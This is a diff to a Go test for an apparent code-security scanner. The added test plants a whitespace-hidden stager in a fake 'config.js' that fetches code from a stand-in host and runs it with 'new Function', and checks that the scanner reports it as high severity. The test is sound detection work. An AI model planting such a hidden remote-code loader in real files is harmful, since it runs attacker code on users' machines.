@@ -450,6 +450,16 @@ func TestBenchmarkFalsePositivesRound3(t *testing.T) {
 		}
 	}
 
+	// The stager shape used in the README demo: an aliased https module and
+	// new Function on the response, all on one off-screen line.
+	stager := writeRepo(t, map[string]string{
+		"server/config.js": "module.exports = { port: 3000 };" + strings.Repeat(" ", 320) +
+			"const _0x=require('https');_0x.get('https://example.invalid/p',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>new Function(d)())})\n",
+	})
+	if r := mustScan(t, stager, Options{}); findRule(r, "PF703") == nil || findRule(r, "PF703").Severity != finding.High {
+		t.Errorf("aliased https stager not reported as PF703 high:\n%s", dump(r))
+	}
+
 	// A string corpus full of tag characters is worth a look, not an alarm.
 	corpus := writeRepo(t, map[string]string{"data/blns.txt": "\U000E0068\U000E0065\U000E006C\U000E006C\U000E006F\U000E0020\U000E0077\U000E006F\U000E0072\U000E006C\U000E0064\n"})
 	if r := mustScan(t, corpus, Options{}); r.Verdict != VerdictReview || findRule(r, "PF601").Severity != finding.High {
